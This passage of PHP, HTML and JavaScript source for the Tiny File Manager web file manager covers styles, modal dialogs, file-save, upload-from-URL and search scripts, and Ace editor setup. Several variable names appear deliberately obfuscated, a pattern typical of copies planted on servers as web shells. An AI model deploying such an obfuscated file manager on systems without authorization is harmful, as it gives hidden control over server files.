        .compact-table td, .compact-table th { width:100px;border:0;text-align:center  }
        .compact-table tr:hover td { background-color:#fff  }
        .filename { max-width:420px;overflow:hidden;text-overflow:ellipsis  }
        .break-word { word-wrap:break-word;margin-left:30px  }
        .break-word.float-left a { color:#7d7d7d  }
        .break-word + .float-right { padding-right:30px;position:relative  }
        .break-word + .float-right > a { color:#7d7d7d;font-size:1.2em;margin-right:4px  }
        #editor { position:absolute;right:15px;top:100px;bottom:15px;left:15px  }
        @media (max-width:481px) {
            #editor { top:150px; }
        }
        #normal-editor { border-radius:3px;border-width:2px;padding:10px;outline:none; }
        .btn-2 { padding:4px 10px;font-size:small; }
        li.file:before,li.folder:before { font:normal normal normal 14px/1 FontAwesome;content:"\f016";margin-right:5px }
        li.folder:before { content:"\f114" }
        i.fa.fa-folder-o { color:#0157b3 }
        i.fa.fa-picture-o { color:#26b99a }
        i.fa.fa-file-archive-o { color:#da7d7d }
        .btn-2 i.fa.fa-file-archive-o { color:inherit }
        i.fa.fa-css3 { color:#f36fa0 }
        i.fa.fa-file-code-o { color:#007bff }
        i.fa.fa-code { color:#cc4b4c }
        i.fa.fa-file-text-o { color:#0096e6 }
        i.fa.fa-html5 { color:#d75e72 }
        i.fa.fa-file-excel-o { color:#09c55d }
        i.fa.fa-file-powerpoint-o { color:#f6712e }
        i.go-back { font-size:1.2em;color:#007bff; }
        .main-nav { padding:0.2rem 1rem;box-shadow:0 4px 5px 0 rgba(0, 0, 0, .14), 0 1px 10px 0 rgba(0, 0, 0, .12), 0 2px 4px -1px rgba(0, 0, 0, .2)  }
        .dataTables_filter { display:none; }
        table.dataTable thead .sorting { cursor:pointer;background-repeat:no-repeat;background-position:center right;background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAQAAADYWf5HAAAAkElEQVQoz7XQMQ5AQBCF4dWQSJxC5wwax1Cq1e7BAdxD5SL+Tq/QCM1oNiJidwox0355mXnG/DrEtIQ6azioNZQxI0ykPhTQIwhCR+BmBYtlK7kLJYwWCcJA9M4qdrZrd8pPjZWPtOqdRQy320YSV17OatFC4euts6z39GYMKRPCTKY9UnPQ6P+GtMRfGtPnBCiqhAeJPmkqAAAAAElFTkSuQmCC'); }
        table.dataTable thead .sorting_asc { cursor:pointer;background-repeat:no-repeat;background-position:center right;background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAYAAAByUDbMAAAAZ0lEQVQ4y2NgGLKgquEuFxBPAGI2ahhWCsS/gDibUoO0gPgxEP8H4ttArEyuQYxAPBdqEAxPBImTY5gjEL9DM+wTENuQahAvEO9DMwiGdwAxOymGJQLxTyD+jgWDxCMZRsEoGAVoAADeemwtPcZI2wAAAABJRU5ErkJggg=='); }
        table.dataTable thead .sorting_desc { cursor:pointer;background-repeat:no-repeat;background-position:center right;background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAYAAAByUDbMAAAAZUlEQVQ4y2NgGAWjYBSggaqGu5FA/BOIv2PBIPFEUgxjB+IdQPwfC94HxLykus4GiD+hGfQOiB3J8SojEE9EM2wuSJzcsFMG4ttQgx4DsRalkZENxL+AuJQaMcsGxBOAmGvopk8AVz1sLZgg0bsAAAAASUVORK5CYII='); }
        table.dataTable thead tr:first-child th.custom-checkbox-header:first-child { background-image:none; }
        .footer-action li { margin-bottom:10px; }
        .app-v-title { font-size:24px;font-weight:300;letter-spacing:-.5px;text-transform:uppercase; }
        hr.custom-hr { border-top:1px dashed #8c8b8b;border-bottom:1px dashed #fff; }
        #snackbar { visibility:hidden;min-width:250px;margin-left:-125px;background-color:#333;color:#fff;text-align:center;border-radius:2px;padding:16px;position:fixed;z-index:1;left:50%;bottom:30px;font-size:17px; }
        #snackbar.show { visibility:visible;-webkit-animation:fadein 0.5s, fadeout 0.5s 2.5s;animation:fadein 0.5s, fadeout 0.5s 2.5s; }
        @-webkit-keyframes fadein { from { bottom:0;opacity:0; }
        to { bottom:30px;opacity:1; }
        }
        @keyframes fadein { from { bottom:0;opacity:0; }
        to { bottom:30px;opacity:1; }
        }
        @-webkit-keyframes fadeout { from { bottom:30px;opacity:1; }
        to { bottom:0;opacity:0; }
        }
        @keyframes fadeout { from { bottom:30px;opacity:1; }
        to { bottom:0;opacity:0; }
        }
        #main-table span.badge { border-bottom:2px solid #f8f9fa }
        #main-table span.badge:nth-child(1) { border-color:#df4227 }
        #main-table span.badge:nth-child(2) { border-color:#f8b600 }
        #main-table span.badge:nth-child(3) { border-color:#00bd60 }
        #main-table span.badge:nth-child(4) { border-color:#4581ff }
        #main-table span.badge:nth-child(5) { border-color:#ac68fc }
        #main-table span.badge:nth-child(6) { border-color:#45c3d2 }
        @media only screen and (min-device-width:768px) and (max-device-width:1024px) and (orientation:landscape) and (-webkit-min-device-pixel-ratio:2) { .navbar-collapse .col-xs-6 { padding:0; }
        }
        .btn.active.focus,.btn.active:focus,.btn.focus,.btn.focus:active,.btn:active:focus,.btn:focus { outline:0!important;outline-offset:0!important;background-image:none!important;-webkit-box-shadow:none!important;box-shadow:none!important }
        .lds-facebook { display:none;position:relative;width:64px;height:64px }
        .lds-facebook div,.lds-facebook.show-me { display:inline-block }
        .lds-facebook div { position:absolute;left:6px;width:13px;background:#007bff;animation:lds-facebook 1.2s cubic-bezier(0,.5,.5,1) infinite }
        .lds-facebook div:nth-child(1) { left:6px;animation-delay:-.24s }
        .lds-facebook div:nth-child(2) { left:26px;animation-delay:-.12s }
        .lds-facebook div:nth-child(3) { left:45px;animation-delay:0s }
        @keyframes lds-facebook { 0% { top:6px;height:51px }
        100%,50% { top:19px;height:26px }
        }
        ul#search-wrapper { padding-left: 0;border: 1px solid #ecececcc; } ul#search-wrapper li { list-style: none; padding: 5px;border-bottom: 1px solid #ecececcc; }
        ul#search-wrapper li:nth-child(odd){ background: #f9f9f9cc;}
        .c-preview-img { max-width: 300px; }
        .border-radius-0 { border-radius: 0; }
        .float-right { float: right; }
        .table-hover>tbody>tr:hover>td:first-child { border-left: 1px solid #1b77fd; }
        #main-table tr.even { background-color: #F8F9Fa; }
        .filename>a>i {margin-right: 3px;}
    </style>
    <?php
 if(FM_THEME=="dark"):?>
        <style>
            :root {
                --bs-bg-opacity: 1;
                --bg-color: #f3daa6;
                --bs-dark-rgb: 28, 36, 41 !important;
                --bs-bg-opacity: 1;
            }
            .table-dark { --bs-table-bg: 28, 36, 41 !important; }
            .btn-primary { --bs-btn-bg: #26566c; --bs-btn-border-color: #26566c; }
            body.theme-dark { background-image: linear-gradient(90deg, #1c2429, #263238); color: #CFD8DC; }
            .list-group .list-group-item { background: #343a40; }
            .theme-dark .navbar-nav i, .navbar-nav .dropdown-toggle, .break-word { color: #CFD8DC; }
            a, a:hover, a:visited, a:active, #main-table .filename a, i.fa.fa-folder-o, i.go-back { color: var(--bg-color); }
            ul#search-wrapper li:nth-child(odd) { background: #212a2f; }
            .theme-dark .btn-outline-primary { color: #b8e59c; border-color: #b8e59c; }
            .theme-dark .btn-outline-primary:hover, .theme-dark .btn-outline-primary:active { background-color: #2d4121;}
            .theme-dark input.form-control { background-color: #101518; color: #CFD8DC; }
            .theme-dark .dropzone { background: transparent; }
            .theme-dark .inline-actions > a > i { background: #79755e; }
            .theme-dark .text-white { color: #CFD8DC !important; }
            .theme-dark .table-bordered td, .table-bordered th { border-color: #343434; }
            .theme-dark .table-bordered td .custom-control-input, .theme-dark .table-bordered th .custom-control-input { opacity: 0.678; }
            .message { background-color: #212529; }
            .compact-table tr:hover td { background-color: #3d3d3d; }
            #main-table tr.even { background-color: #21292f; }
            form.dropzone { border-color: #79755e; }
        </style>
    <?php endif;?>
</head>
<body class="<?php echo(FM_THEME=="dark")?'theme-dark':'';?> <?php echo $hhhhhhhhhhh;?>">
<div id="wrapper" class="container-fluid">
    <!-- New Item creation -->
    <div class="modal fade" id="createNewItem" tabindex="-1" role="dialog" data-bs-backdrop="static" data-bs-keyboard="false" aria-labelledby="newItemModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
            <form class="modal-content <?php echo fm_get_theme();?>" method="post">
                <div class="modal-header">
                    <h5 class="modal-title" id="newItemModalLabel"><i class="fa fa-plus-square fa-fw"></i><?php echo lng('CreateNewItem')?></h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <p><label for="newfile"><?php echo lng('ItemType')?> </label></p>
                    <div class="form-check form-check-inline">
                      <input class="form-check-input" type="radio" name="newfile" id="customRadioInline1" name="newfile" value="file">
                      <label class="form-check-label" for="customRadioInline1"><?php echo lng('File')?></label>
                    </div>
                    <div class="form-check form-check-inline">
                      <input class="form-check-input" type="radio" name="newfile" id="customRadioInline2" value="folder" checked>
                      <label class="form-check-label" for="customRadioInline2"><?php echo lng('Folder')?></label>
                    </div>

                    <p class="mt-3"><label for="newfilename"><?php echo lng('ItemName')?> </label></p>
                    <input type="text" name="newfilename" id="newfilename" value="" class="form-control" placeholder="<?php echo lng('Enter here...')?>" required>
                </div>
                <div class="modal-footer">
                    <input type="hidden" name="token" value="<?php echo $_SESSION['token'];?>">
                    <button type="button" class="btn btn-outline-primary" data-bs-dismiss="modal"><i class="fa fa-times-circle"></i> <?php echo lng('Cancel')?></button>
                    <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php echo lng('CreateNow')?></button>
                </div>
            </form>
        </div>
    </div>

    <!-- Advance Search Modal -->
    <div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
      <div class="modal-dialog modal-lg" role="document">
        <div class="modal-content <?php echo fm_get_theme();?>">
          <div class="modal-header">
            <h5 class="modal-title col-10" id="searchModalLabel">
                <div class="input-group mb-3">
                  <input type="text" class="form-control" placeholder="<?php echo lng('Search')?> <?php echo lng('a files')?>" aria-label="<?php echo lng('Search')?>" aria-describedby="search-addon3" id="advanced-search" autofocus required>
                  <span class="input-group-text" id="search-addon3"><i class="fa fa-search"></i></span>
                </div>
            </h5>
            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
          </div>
          <div class="modal-body">
            <form action="" method="post">
                <div class="lds-facebook"><div></div><div></div><div></div></div>
                <ul id="search-wrapper">
                    <p class="m-2"><?php echo lng('Search file in folder and subfolders...')?></p>
                </ul>
            </form>
          </div>
        </div>
      </div>
    </div>

    <!--Rename Modal -->
    <div class="modal modal-alert" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" role="dialog" id="renameDailog">
      <div class="modal-dialog" role="document">
        <form class="modal-content rounded-3 shadow <?php echo fm_get_theme();?>" method="post" autocomplete="off">
          <div class="modal-body p-4 text-center">
            <h5 class="mb-3"><?php echo lng('Are you sure want to rename?')?></h5>
            <p class="mb-1">
                <input type="text" name="rename_to" id="js-rename-to" class="form-control" placeholder="<?php echo lng('Enter new file name')?>" required>
                <input type="hidden" name="token" value="<?php echo $_SESSION['token'];?>">
                <input type="hidden" name="rename_from" id="js-rename-from">
            </p>
          </div>
          <div class="modal-footer flex-nowrap p-0">
            <button type="button" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0 border-end" data-bs-dismiss="modal"><?php echo lng('Cancel')?></button>
            <button type="submit" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0"><strong><?php echo lng('Okay')?></strong></button>
          </div>
        </form>
      </div>
    </div>

    <!-- Confirm Modal -->
    <script type="text/html" id="js-tpl-confirm">
        <div class="modal modal-alert confirmDailog" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" role="dialog" id="confirmDailog-<%this.id%>">
          <div class="modal-dialog" role="document">
            <form class="modal-content rounded-3 shadow <?php echo fm_get_theme();?>" method="post" autocomplete="off" action="<%this.action%>">
              <div class="modal-body p-4 text-center">
                <h5 class="mb-2"><?php echo lng('Are you sure want to')?> <%this.title%> ?</h5>
                <p class="mb-1"><%this.content%></p>
              </div>
              <div class="modal-footer flex-nowrap p-0">
                <button type="button" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0 border-end" data-bs-dismiss="modal"><?php echo lng('Cancel')?></button>
                <input type="hidden" name="token" value="<?php echo $_SESSION['token'];?>">
                <button type="submit" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0" data-bs-dismiss="modal"><strong><?php echo lng('Okay')?></strong></button>
              </div>
            </form>
          </div>
        </div>
    </script>

    <?php
}function fm_show_footer(){?>
</div>
<?php print_external('js-jquery');?>
<?php print_external('js-bootstrap');?>
<?php print_external('js-jquery-datatables');?>
<?php if(FM_USE_HIGHLIGHTJS&&isset($_GET['view'])):?>
    <?php print_external('js-highlightjs');?>
    <script>hljs.highlightAll(); var isHighlightingEnabled = true;</script>
<?php endif;?>
<script>
    function template(html,options){
        var re=/<\%([^\%>]+)?\%>/g,reExp=/(^( )?(if|for|else|switch|case|break|{|}))(.*)?/g,code='var r=[];\n',cursor=0,match;var add=function(line,js){js?(code+=line.match(reExp)?line+'\n':'r.push('+line+');\n'):(code+=line!=''?'r.push("'+line.replace(/"/g,'\\"')+'");\n':'');return add}
        while(match=re.exec(html)){add(html.slice(cursor,match.index))(match[1],!0);cursor=match.index+match[0].length}
        add(html.substr(cursor,html.length-cursor));code+='return r.join("");';return new Function(code.replace(/[\r\t\n]/g,'')).apply(options)
    }
    function rename(e, t) { if(t) { $("#js-rename-from").val(t);$("#js-rename-to").val(t); $("#renameDailog").modal('show'); } }
    function change_checkboxes(e, t) { for (var n = e.length - 1; n >= 0; n--) e[n].checked = "boolean" == typeof t ? t : !e[n].checked }
    function get_checkboxes() { for (var e = document.getElementsByName("file[]"), t = [], n = e.length - 1; n >= 0; n--) (e[n].type = "checkbox") && t.push(e[n]); return t }
    function select_all() { change_checkboxes(get_checkboxes(), !0) }
    function unselect_all() { change_checkboxes(get_checkboxes(), !1) }
    function invert_all() { change_checkboxes(get_checkboxes()) }
    function checkbox_toggle() { var e = get_checkboxes(); e.push(this), change_checkboxes(e) }
    function backup(e, t) { // Create file backup with .bck
        var n = new XMLHttpRequest,
            a = "path=" + e + "&file=" + t + "&token="+ window.csrf +"&type=backup&ajax=true";
        return n.open("POST", "", !0), n.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), n.onreadystatechange = function () {
            4 == n.readyState && 200 == n.status && toast(n.responseText)
        }, n.send(a), !1
    }
    // Toast message
    function toast(txt) { var x = document.getElementById("snackbar");x.innerHTML=txt;x.className = "show";setTimeout(function(){ x.className = x.className.replace("show", ""); }, 3000); }
    // Save file
    function edit_save(e, t) {
        var n = "ace" == t ? editor.getSession().getValue() : document.getElementById("normal-editor").value;
        if (typeof n !== 'undefined' && n !== null) {
            if (true) {
                var data = {ajax: true, content: n, type: 'save', token: window.csrf};

                $.ajax({
                    type: "POST",
                    url: window.location,
                    data: JSON.stringify(data),
                    contentType: "application/json; charset=utf-8",
                    success: function(mes){toast("Saved Successfully"); window.onbeforeunload = function() {return}},
                    failure: function(mes) {toast("Error: try again");},
                    error: function(mes) {toast(`<p style="background-color:red">${mes.responseText}</p>`);}
                });
            } else {
                var a = document.createElement("form");
                a.setAttribute("method", "POST"), a.setAttribute("action", "");
                var o = document.createElement("textarea");
                o.setAttribute("type", "textarea"), o.setAttribute("name", "savedata");
                let cx = document.createElement("input"); cx.setAttribute("type", "hidden");cx.setAttribute("name", "token");cx.setAttribute("value", window.csrf);
                var c = document.createTextNode(n);
                o.appendChild(c), a.appendChild(o), a.appendChild(cx), document.body.appendChild(a), a.submit()
            }
        }
    }
    function show_new_pwd() { $(".js-new-pwd").toggleClass('hidden'); }
    // Save Settings
    function save_settings($this) {
        let form = $($this);
        $.ajax({
            type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&token="+ window.csrf +"&ajax="+true,
            success: function (data) {if(data) { window.location.reload();}}
        }); return false;
    }
    //Create new password hash
    function new_password_hash($this) {
        let form = $($this), $pwd = $("#js-pwd-result"); $pwd.val('');
        $.ajax({
            type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&token="+ window.csrf +"&ajax="+true,
            success: function (data) { if(data) { $pwd.val(data); } }
        }); return false;
    }
    // Upload files using URL @param {Object}
    function upload_from_url($this) {
        let form = $($this), resultWrapper = $("div#js-url-upload__list");
        $.ajax({
            type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&token="+ window.csrf +"&ajax="+true,
            beforeSend: function() { form.find("input[name=uploadurl]").attr("disabled","disabled"); form.find("button").hide(); form.find(".lds-facebook").addClass('show-me'); },
            success: function (data) {
                if(data) {
                    data = JSON.parse(data);
                    if(data.done) {
                        resultWrapper.append('<div class="alert alert-success row">Uploaded Successful: '+data.done.name+'</div>'); form.find("input[name=uploadurl]").val('');
                    } else if(data['fail']) { resultWrapper.append('<div class="alert alert-danger row">Error: '+data.fail.message+'</div>'); }
                    form.find("input[name=uploadurl]").removeAttr("disabled");form.find("button").show();form.find(".lds-facebook").removeClass('show-me');
                }
            },
            error: function(xhr) {
                form.find("input[name=uploadurl]").removeAttr("disabled");form.find("button").show();form.find(".lds-facebook").removeClass('show-me');console.error(xhr);
            }
        }); return false;
    }
    // Search template
    function search_template(data) {
        var response = "";
        $.each(data, function (key, val) {
            response += `<li><a href="?p=${val.path}&view=${val.name}">${val.path}/${val.name}</a></li>`;
        });
        return response;
    }
    // Advance search
    function fm_search() {
        var searchTxt = $("input#advanced-search").val(), searchWrapper = $("ul#search-wrapper"), path = $("#js-search-modal").attr("href"), _html = "", $loader = $("div.lds-facebook");
        if(!!searchTxt && searchTxt.length > 2 && path) {
            var data = {ajax: true, content: searchTxt, path:path, type: 'search', token: window.csrf };
            $.ajax({
                type: "POST",
                url: window.location,
                data: data,
                beforeSend: function() {
                    searchWrapper.html('');
                    $loader.addClass('show-me');
                },
                success: function(data){
                    $loader.removeClass('show-me');
                    data = JSON.parse(data);
                    if(data && data.length) {
                        _html = search_template(data);
                        searchWrapper.html(_html);
                    } else { searchWrapper.html('<p class="m-2">No result found!<p>'); }
                },
                error: function(xhr) { $loader.removeClass('show-me'); searchWrapper.html('<p class="m-2">ERROR: Try again later!</p>'); },
                failure: function(mes) { $loader.removeClass('show-me'); searchWrapper.html('<p class="m-2">ERROR: Try again later!</p>');}
            });
        } else { searchWrapper.html("OOPS: minimum 3 characters required!"); }
    }

    // action confirm dailog modal
    function confirmDailog(e, id = 0, title = "Action", content = "", action = null) {
        e.preventDefault();
        const tplObj = {id, title, content: decodeURIComponent(content.replace(/\+/g, ' ')), action};
        let tpl = $("#js-tpl-confirm").html();
        $(".modal.confirmDailog").remove();
        $('#wrapper').append(template(tpl,tplObj));
        const $confirmDailog = $("#confirmDailog-"+tplObj.id);
        $confirmDailog.modal('show');
        return false;
    }
    

    // on mouse hover image preview
    !function(s){s.previewImage=function(e){var o=s(document),t=".previewImage",a=s.extend({xOffset:20,yOffset:-20,fadeIn:"fast",css:{padding:"5px",border:"1px solid #cccccc","background-color":"#fff"},eventSelector:"[data-preview-image]",dataKey:"previewImage",overlayId:"preview-image-plugin-overlay"},e);return o.off(t),o.on("mouseover"+t,a.eventSelector,function(e){s("p#"+a.overlayId).remove();var o=s("<p>").attr("id",a.overlayId).css("position","absolute").css("display","none").append(s('<img class="c-preview-img">').attr("src",s(this).data(a.dataKey)));a.css&&o.css(a.css),s("body").append(o),o.css("top",e.pageY+a.yOffset+"px").css("left",e.pageX+a.xOffset+"px").fadeIn(a.fadeIn)}),o.on("mouseout"+t,a.eventSelector,function(){s("#"+a.overlayId).remove()}),o.on("mousemove"+t,a.eventSelector,function(e){s("#"+a.overlayId).css("top",e.pageY+a.yOffset+"px").css("left",e.pageX+a.xOffset+"px")}),this},s.previewImage()}(jQuery);

    // Dom Ready Events
    $(document).ready( function () {
        // dataTable init
        var $table = $('#main-table'),
            tableLng = $table.find('th').length,
            _targets = (tableLng && tableLng == 7 ) ? [0, 4,5,6] : tableLng == 5 ? [0,4] : [3];
            mainTable = $('#main-table').DataTable({paging: false, info: false, order: [], columnDefs: [{targets: _targets, orderable: false}]
        });
        // filter table
        $('#search-addon').on( 'keyup', function () {
            mainTable.search( this.value ).draw();
        });
        $("input#advanced-search").on('keyup', function (e) {
            if (e.keyCode === 13) { fm_search(); }
        });
        $('#search-addon3').on( 'click', function () { fm_search(); });
        //upload nav tabs
        $(".fm-upload-wrapper .card-header-tabs").on("click", 'a', function(e){
            e.preventDefault();let target=$(this).data('target');
            $(".fm-upload-wrapper .card-header-tabs a").removeClass('active');$(this).addClass('active');
            $(".fm-upload-wrapper .card-tabs-container").addClass('hidden');$(target).removeClass('hidden');
        });
    });
</script>
<?php if(isset($_GET['edit'])&&isset($_GET['env'])&&FM_EDIT_FILE&&!FM_READONLY):$mmmm=pathinfo($_GET["edit"],PATHINFO_EXTENSION);$mmmm=$mmmm=="js"?"javascript":$mmmm;?>
    <?php print_external('js-ace');?>
    <script>
        var editor = ace.edit("editor");
        editor.getSession().setMode( {path:"ace/mode/<?php echo $mmmm;?>", inline:true} );
        //editor.setTheme("ace/theme/twilight"); //Dark Theme
        editor.setShowPrintMargin(false); // Hide the vertical ruler
        function ace_commend (cmd) { editor.commands.exec(cmd, editor); }
        editor.commands.addCommands([{
            name: 'save', bindKey: {win: 'Ctrl-S',  mac: 'Command-S'},
            exec: function(editor) { edit_save(this, 'ace'); }
        }]);
        function renderThemeMode() {
            var $modeEl = $("select#js-ace-mode"), $themeEl = $("select#js-ace-theme"), $fontSizeEl = $("select#js-ace-fontSize"), optionNode = function(type, arr){ var $Option = ""; $.each(arr, function(i, val) { $Option += "<option value='"+type+i+"'>" + val + "</option>"; }); return $Option; },
                _data = {"aceTheme":{"bright":{"chrome":"Chrome","clouds":"Clouds","crimson_editor":"Crimson Editor","dawn":"Dawn","dreamweaver":"Dreamweaver","eclipse":"Eclipse","github":"GitHub","iplastic":"IPlastic","solarized_light":"Solarized Light","textmate":"TextMate","tomorrow":"Tomorrow","xcode":"XCode","kuroir":"Kuroir","katzenmilch":"KatzenMilch","sqlserver":"SQL Server"},"dark":{"ambiance":"Ambiance","chaos":"Chaos","clouds_midnight":"Clouds Midnight","dracula":"Dracula","cobalt":"Cobalt","gruvbox":"Gruvbox","gob":"Green on Black","idle_fingers":"idle Fingers","kr_theme":"krTheme","merbivore":"Merbivore","merbivore_soft":"Merbivore Soft","mono_industrial":"Mono Industrial","monokai":"Monokai","pastel_on_dark":"Pastel on dark","solarized_dark":"Solarized Dark","terminal":"Terminal","tomorrow_night":"Tomorrow Night","tomorrow_night_blue":"Tomorrow Night Blue","tomorrow_night_bright":"Tomorrow Night Bright","tomorrow_night_eighties":"Tomorrow Night 80s","twilight":"Twilight","vibrant_ink":"Vibrant Ink"}},"aceMode":{"javascript":"JavaScript","abap":"ABAP","abc":"ABC","actionscript":"ActionScript","ada":"ADA","apache_conf":"Apache Conf","asciidoc":"AsciiDoc","asl":"ASL","assembly_x86":"Assembly x86","autohotkey":"AutoHotKey","apex":"Apex","batchfile":"BatchFile","bro":"Bro","c_cpp":"C and C++","c9search":"C9Search","cirru":"Cirru","clojure":"Clojure","cobol":"Cobol","coffee":"CoffeeScript","coldfusion":"ColdFusion","csharp":"C#","csound_document":"Csound Document","csound_orchestra":"Csound","csound_score":"Csound Score","css":"CSS","curly":"Curly","d":"D","dart":"Dart","diff":"Diff","dockerfile":"Dockerfile","dot":"Dot","drools":"Drools","edifact":"Edifact","eiffel":"Eiffel","ejs":"EJS","elixir":"Elixir","elm":"Elm","erlang":"Erlang","forth":"Forth","fortran":"Fortran","fsharp":"FSharp","fsl":"FSL","ftl":"FreeMarker","gcode":"Gcode","gherkin":"Gherkin","gitignore":"Gitignore","glsl":"Glsl","gobstones":"Gobstones","golang":"Go","graphqlschema":"GraphQLSchema","groovy":"Groovy","haml":"HAML","handlebars":"Handlebars","haskell":"Haskell","haskell_cabal":"Haskell Cabal","haxe":"haXe","hjson":"Hjson","html":"HTML","html_elixir":"HTML (Elixir)","html_ruby":"HTML (Ruby)","ini":"INI","io":"Io","jack":"Jack","jade":"Jade","java":"Java","json":"JSON","jsoniq":"JSONiq","jsp":"JSP","jssm":"JSSM","jsx":"JSX","julia":"Julia","kotlin":"Kotlin","latex":"LaTeX","less":"LESS","liquid":"Liquid","lisp":"Lisp","livescript":"LiveScript","logiql":"LogiQL","lsl":"LSL","lua":"Lua","luapage":"LuaPage","lucene":"Lucene","makefile":"Makefile","markdown":"Markdown","mask":"Mask","matlab":"MATLAB","maze":"Maze","mel":"MEL","mixal":"MIXAL","mushcode":"MUSHCode","mysql":"MySQL","nix":"Nix","nsis":"NSIS","objectivec":"Objective-C","ocaml":"OCaml","pascal":"Pascal","perl":"Perl","perl6":"Perl 6","pgsql":"pgSQL","php_laravel_blade":"PHP (Blade Template)","php":"PHP","puppet":"Puppet","pig":"Pig","powershell":"Powershell","praat":"Praat","prolog":"Prolog","properties":"Properties","protobuf":"Protobuf","python":"Python","r":"R","razor":"Razor","rdoc":"RDoc","red":"Red","rhtml":"RHTML","rst":"RST","ruby":"Ruby","rust":"Rust","sass":"SASS","scad":"SCAD","scala":"Scala","scheme":"Scheme","scss":"SCSS","sh":"SH","sjs":"SJS","slim":"Slim","smarty":"Smarty","snippets":"snippets","soy_template":"Soy Template","space":"Space","sql":"SQL","sqlserver":"SQLServer","stylus":"Stylus","svg":"SVG","swift":"Swift","tcl":"Tcl","terraform":"Terraform","tex":"Tex","text":"Text","textile":"Textile","toml":"Toml","tsx":"TSX","twig":"Twig","typescript":"Typescript","vala":"Vala","vbscript":"VBScript","velocity":"Velocity","verilog":"Verilog","vhdl":"VHDL","visualforce":"Visualforce","wollok":"Wollok","xml":"XML","xquery":"XQuery","yaml":"YAML","django":"Django"},"fontSize":{8:8,10:10,11:11,12:12,13:13,14:14,15:15,16:16,17:17,18:18,20:20,22:22,24:24,26:26,30:30}};
            if(_data && _data.aceMode) { $modeEl.html(optionNode("ace/mode/", _data.aceMode)); }
            if(_data && _data.aceTheme) { var lightTheme = optionNode("ace/theme/", _data.aceTheme.bright), darkTheme = optionNode("ace/theme/", _data.aceTheme.dark); $themeEl.html("<optgroup label=\"Bright\">"+lightTheme+"</optgroup><optgroup label=\"Dark\">"+darkTheme+"</optgroup>");}
            if(_data && _data.fontSize) { $fontSizeEl.html(optionNode("", _data.fontSize)); }
            $modeEl.val( editor.getSession().$modeId );
            $themeEl.val( editor.getTheme() );
            $fontSizeEl.val(12).change(); //set default font size in drop down
        }

        $(function(){
            renderThemeMode();
            $(".js-ace-toolbar").on("click", 'button', function(e){
                e.preventDefault();
                let cmdValue = $(this).attr("data-cmd"), editorOption = $(this).attr("data-option");
                if(cmdValue && cmdValue != "none") {
                    ace_commend(cmdValue);
                } else if(editorOption) {
                    if(editorOption == "fullscreen") {
                        (void 0!==document.fullScreenElement&&null===document.fullScreenElement||void 0!==document.msFullscreenElement&&null===document.msFullscreenElement||void 0!==document.mozFullScreen&&!document.mozFullScreen||void 0!==document.webkitIsFullScreen&&!document.webkitIsFullScreen)
                        &&(editor.container.requestFullScreen?editor.container.requestFullScreen():editor.container.mozRequestFullScreen?editor.container.mozRequestFullScreen():editor.container.webkitRequestFullScreen?editor.container.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT):editor.container.msRequestFullscreen&&editor.container.msRequestFullscreen());
                    } else if(editorOption == "wrap") {
                        let wrapStatus = (editor.getSession().getUseWrapMode()) ? false : true;
                        editor.getSession().setUseWrapMode(wrapStatus);
                    }
                }
            });
            $("select#js-ace-mode, select#js-ace-theme, select#js-ace-fontSize").on("change", function(e){
                e.preventDefault();
                let selectedValue = $(this).val(), selectionType = $(this).attr("data-type");
                if(selectedValue && selectionType == "mode") {
                    editor.getSession().setMode(selectedValue);
                } else if(selectedValue && selectionType == "theme") {
                    editor.setTheme(selectedValue);
                }else if(selectedValue && selectionType == "fontSize") {
                    editor.setFontSize(parseInt(selectedValue));
                }
            });
        });
    </script>
<?php endif;?>
<div id="snackbar"></div>
</body>
</html>
<?php
}function lng($rrrrrrrrrrr){global $oo;$iiiiiiiii['en']['AppName']='Tiny File Manager';$iiiiiiiii['en']['AppTitle']='File Manager';$iiiiiiiii['en']['Login']='Sign in';$iiiiiiiii['en']['Username']='Username';$iiiiiiiii['en']['Password']='Password';$iiiiiiiii['en']['Logout']='Sign Out';$iiiiiiiii['en']['Move']='Move';$iiiiiiiii['en']['Copy']='Copy';$iiiiiiiii['en']['Save']='Save';$iiiiiiiii['en']['SelectAll']='Select all';$iiiiiiiii['en']['UnSelectAll']='Unselect all';$iiiiiiiii['en']['File']='File';$iiiiiiiii['en']['Back']='Back';$iiiiiiiii['en']['Size']='Size';$iiiiiiiii['en']['Perms']='Perms';$iiiiiiiii['en']['Modified']='Modified';$iiiiiiiii['en']['Owner']='Owner';$iiiiiiiii['en']['Search']='Search';$iiiiiiiii['en']['NewItem']='New Item';$iiiiiiiii['en']['Folder']='Folder';$iiiiiiiii['en']['Delete']='Delete';$iiiiiiiii['en']['Rename']='Rename';$iiiiiiiii['en']['CopyTo']='Copy to';$iiiiiiiii['en']['DirectLink']='Direct link';$iiiiiiiii['en']['UploadingFiles']='Upload Files';$iiiiiiiii['en']['ChangePermissions']='Change Permissions';$iiiiiiiii['en']['Copying']='Copying';$iiiiiiiii['en']['CreateNewItem']='Create New Item';$iiiiiiiii['en']['Name']='Name';$iiiiiiiii['en']['AdvancedEditor']='Advanced Editor';$iiiiiiiii['en']['Actions']='Actions';$iiiiiiiii['en']['Folder is empty']='Folder is empty';$iiiiiiiii['en']['Upload']='Upload';$iiiiiiiii['en']['Cancel']='Cancel';$iiiiiiiii['en']['InvertSelection']='Invert 